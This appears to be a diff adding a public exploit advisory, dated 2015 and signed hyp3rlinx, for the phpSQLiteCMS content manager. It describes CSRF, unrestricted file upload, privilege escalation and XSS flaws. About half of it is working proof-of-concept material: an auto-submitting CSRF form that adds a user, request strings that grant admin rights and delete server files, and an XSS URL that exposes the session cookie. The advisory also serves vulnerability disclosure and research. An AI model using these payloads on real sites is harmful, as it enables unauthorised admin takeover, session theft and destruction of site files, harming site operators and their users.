@@ -1,0 +1,194 @@
+# Exploit Title:  CSRF, Unrestricted File Upload, Privilege escalation & XSS
+# Google Dork: intitle: CSRF, Unrestricted File Upload, Privilege
+escalation & XSS
+# Date: 2015-07-12
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: phpsqlitecms.net
+# Software Link: phpsqlitecms.net/download
+# Version: ilosuna-phpsqlitecms-d9b8219
+# Tested on: windows 7 SP1
+# Category: Web apps CMS
+
+Vendor:
+================================
+phpsqlitecms.net
+
+
+
+Product:
+================================
+ilosuna-phpsqlitecms-d9b8219
+
+
+Advisory Information:
+==============================================================================
+CSRF, Unrestricted File type upload, Privilege escalation & XSS
+Vulnerabilities.
+User will be affected if they visit a malicious website or click any
+infected link.
+Possibly resulting in malicious attackers taking control of the Admin / CMS
+area.
+
+
+Vulnerability Details:
+=====================
+
+CSRF:
+-----
+We can add arbitrary users to the system, delete arbitrary web server files
+and escalate privileges, as no CSRF token is present.
+
+Add arbitrary user:
+-------------------
+The following request variables are all that is needed to add users to
+system.
+mode = users
+new_user_submitted = true
+name = "hyp3rlinx"
+pw = "12345"
+pw_r = "12345"
+
+
+Privilege escalation:
+---------------------
+Under users area in admin we can easily gain admin privileges, again using
+CSRF vulnerability we
+submit form using our id and change request variable to type '1' granting
+us admin privileges.
+
+e.g.
+
+mode:users
+edit_user_submitted:true
+id:3
+name:hyp3rlinx
+new_pw:
+new_pw_r:
+type:1   <------make us admin
+
+
+Delete arbitrary files:
+------------------------
+The following request parameters are all we is need to delete files from
+media or files directorys
+under the web servers CMS area.
+
+mode=filemanager
+directory=files
+delete=index.html
+confirmed=true
+
+
+XSS:
+-----
+We can steal PHP session cookie via XSS vulnerability
+
+
+Unrestricted File Type Upload:
+------------------------------
+The files & media dirs will happily take .PHP, .EXE etc... and PHP scripts
+when selected will execute
+whatever PHP script we upload.
+
+
+Exploit code(s):
+===============
+
+1- CSRF POC Add arbitrary users to the system.
+---------------------------------------------
+
+<script>
+function doit(){
+var e=document.getElementById('evil')
+e.submit()
+}
+</script>
+</head>
+
+<body onLoad="doit()">
+<form id="evil" action="
+http://localhost/ilosuna-phpsqlitecms-d9b8219/ilosuna-phpsqlitecms-d9b8219/cms/index.php"
+method="post">
+<input type="text" name="mode" value="users"/>
+<input type="text" name="new_user_submitted" value="true"/>
+<input type="text" name="name" value="hyp3rlinx" />
+<input type="text" name="pw" value="abc123" />
+<input type="text" name="pw_r" value="abc123" />
+</form>
+
+
+2- CSRF privilege escalation POST URL:
+--------------------------------------
+http://localhost/ilosuna-phpsqlitecms-d9b8219/ilosuna-phpsqlitecms-d9b8219/cms/index.php
+
+
+Privilege escalation request string:
+------------------------------------
+mode=users&edit_user_submitted=true&id=3&name=hyp3rlinx&new_pw=&new_pw_r=&type=1
+
+
+3- CSRF Delete Aribitary Server Files:
+--------------------------------------
+Below request URL will delete the index.html file in files dir on web
+server without any type
+of request validation CSRF token etc.
+
+
+http://localhost/ilosuna-phpsqlitecms-d9b8219/ilosuna-phpsqlitecms-d9b8219/cms/index.php?mode=filemanager
+&directory=files&delete=index.html&confirmed=true
+
+
+XSS steal PHP session ID POC:
+-----------------------------
+http://localhost/ilosuna-phpsqlitecms-d9b8219/ilosuna-phpsqlitecms-d9b8219/cms/index.php?mode=comments&type=0&
+edit=49&comment_id="/><script>alert('XSS by hyp3rlinx
+'%2bdocument.cookie)</script>&page=1
+
+
+Disclosure Timeline:
+=========================================================
+
+
+Vendor Notification:  NA
+July 12, 2015  : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):             [+] POST & GET
+
+
+Vulnerable Product:              [+] ilosuna-phpsqlitecms-d9b8219
+
+
+Vulnerable Parameter(s):      [+] comment_id, delete, type,
+new_user_submitted
+
+
+Affected Area(s):                  [+] Admin & CMS
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+
+(hyp3rlinx)
